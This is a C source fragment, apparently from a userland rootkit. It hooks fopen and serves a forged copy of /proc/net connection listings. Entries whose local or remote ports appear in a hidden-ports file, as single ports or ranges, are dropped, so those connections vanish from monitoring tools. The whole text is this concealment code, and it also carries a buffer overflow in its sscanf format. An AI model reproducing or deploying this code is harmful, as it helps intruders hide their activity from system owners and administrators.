int is_hidden_port(int port){
    FILE *fp;
    char buf[128], *buf_tok = NULL;
    int hidden_status = 0,
        low_port,
        high_port;

    hook(CFOPEN);
    fp = call(CFOPEN, HIDEPORTS, "r");
    if(fp == NULL) return 0;

    while(fgets(buf, sizeof(buf), fp) != NULL){
        buf[strlen(buf) - 1] = '\0';

        if(strstr(buf, "-")){   /* hide specific port ranges */
            /* get the lowest and highest ports within the range... */
            buf_tok = strtok(buf, "-");
            low_port = atoi(buf_tok);       /* low */

            buf_tok = strtok(NULL, "-");
            high_port = atoi(buf_tok);      /* high */

            /* current port we're checking is within our specified hidden range. */
            if(port >= low_port && port <= high_port){
                hidden_status = 1;
                break;
            }
        }

        if(port == atoi(buf)){   /* current port we're checking is hidden */
            hidden_status = 1;
            break;
        }
    }

    memset(buf, 0, strlen(buf));
    fclose(fp);
    return hidden_status;
}

FILE *forge_procnet(const char *pathname){
    FILE *tmp = tmpfile(), *pnt;
    char line[LINE_MAX], raddr[128],
         laddr[128], etc[128];
    unsigned long rxq, txq, t_len,
                  retr, inode;
    int lport, rport, d,
        state, uid, t_run,
        tout;

    hook(CFOPEN);
    pnt = call(CFOPEN, pathname, "r");
    if(pnt == NULL) return NULL;
    if(tmp == NULL) return pnt;

    char *fmt = "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n";
    /* begin reading entries from said procnet file */
    while(fgets(line, sizeof(line), pnt) != NULL){
        /* read information from the current entry so we can see
           whether or not it should be hidden. */
        sscanf(line, fmt, &d, laddr, &lport, raddr, &rport, &state, &txq,
                          &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
                          etc);

        /* write information about the connection as long as it's
           not one that should be hidden... */
        if(!is_hidden_port(lport) && !is_hidden_port(rport))
            fputs(line, tmp);
    }

    fclose(pnt);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}
